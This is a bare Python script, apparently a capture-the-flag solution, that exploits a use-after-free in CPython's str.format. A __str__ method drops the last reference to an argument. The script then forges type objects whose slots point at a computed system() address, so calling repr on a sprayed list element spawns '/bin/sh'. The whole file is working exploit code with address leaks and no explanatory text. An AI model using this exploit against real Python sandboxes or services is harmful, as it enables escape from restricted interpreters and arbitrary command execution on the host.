def main(format):
    p64=lambda x:int.to_bytes(x,8,'little')
    system_plt = id(int)-0x31c300 + 0x594e0
    evilclass=p64(0x1337)+p64(id(type(int)))+p64(0)*2+p64(16)+p64(system_plt)*50
    evil=b'.bin/sh\x00'+p64(id(evilclass)+0x20)

    S = type('S', (str,), {})
    
    def hello_init(self, a):
        self.a = a
    def hello_str(self):
        self.a = None
        s = S("\x00"*0x3f)
        print(hex(id(s)))
        return s
    
    Hello = type('Hello', (), {'__init__': hello_init, '__str__': hello_str})

    evila = evil*0xe
    evilb = evil*0xe
    print(hex(id(evila)), hex(id(evilb)))

    tmp = str(1).zfill(15)
    a = str(2).zfill(15)
    b = str(2).zfill(15)
    print(hex(id(a)), hex(id(b)))

    b = None
    l = [evilb]*8
    print(hex(id(l)))
    
    args = ("A"*0x20+"{}", Hello(a))
    a = None
    format(*args)
    
    repr(l[0])
main(format)
EOF

